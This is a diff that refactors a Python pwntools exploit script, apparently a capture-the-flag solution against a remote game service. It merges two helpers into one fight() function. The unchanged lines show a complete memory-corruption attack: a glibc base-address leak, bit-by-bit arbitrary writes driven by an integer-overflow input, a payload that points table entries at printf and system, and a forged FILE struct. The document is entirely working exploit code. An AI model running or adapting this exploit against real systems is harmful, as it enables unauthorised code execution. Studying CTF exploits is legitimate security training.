@@ -14,23 +14,10 @@ def get_process():
     return remote(host, port, ssl=True)
 
 
-def lose_fight():
+def fight(win: bool = False):
     io.sendlineafter(b'> ', b'f')
-    io.sendlineafter(b'Player plays: ', b'0')
-    assert b'Bot wins!' in io.recvline()
-
-
-def win_fight():
-    io.sendlineafter(b'> ', b'f')
-    io.sendlineafter(b'Player plays: ', str(2 ** 64 - 1).encode())
-    assert b'You win!' in io.recvline()
-
-
-def simulate_bot(number: int) -> bool:
-    io.sendlineafter(b'> ', b's')
-    io.sendlineafter(b'Bot number: ', str(number).encode())
-    io.sendlineafter(b'Player number: ', b'-')
-    return b'Bot win!' in io.recvline()
+    io.sendlineafter(b'Player plays: ', b'18446744073709551615' if win else b'0')
+    assert (b'You win!' if win else b'Bot wins!') in io.recvline()
 
 
 def simulate_player(number: int) -> bool:
@@ -64,15 +51,12 @@ glibc.address = ((known & 0x7fffffffffff) | 0x7e0000000000) - 0x955c2
 io.success(f'Glibc base address: {hex(glibc.address)}')
 
 for _ in range(128):
-    lose_fight()
+    fight()
 
 target = 0x4040a0
 
 for i in range(64):
-    if (target >> i) & 1:
-        win_fight()
-    else:
-        lose_fight()
+    fight(win=bool((target >> i) & 1))
 
 payload = p64(0x404088)          + p64(glibc.sym.__stack_chk_fail) + \
           p64(glibc.sym.printf)  + p64(glibc.sym.system)           + \
@@ -106,10 +90,7 @@ prog = io.progress('Writing FILE struct')
 for i, target in enumerate([u64(fp[i : i + 8]) for i in range(0, len(fp), 8)]):
     prog.status(f'{i + 1} / {len(fp) // 8}')
     for i in range(64):
-        if (target >> i) & 1:
-            win_fight()
-        else:
-            lose_fight()
+        fight(win=bool((target >> i) & 1))
 
 prog.success()
 
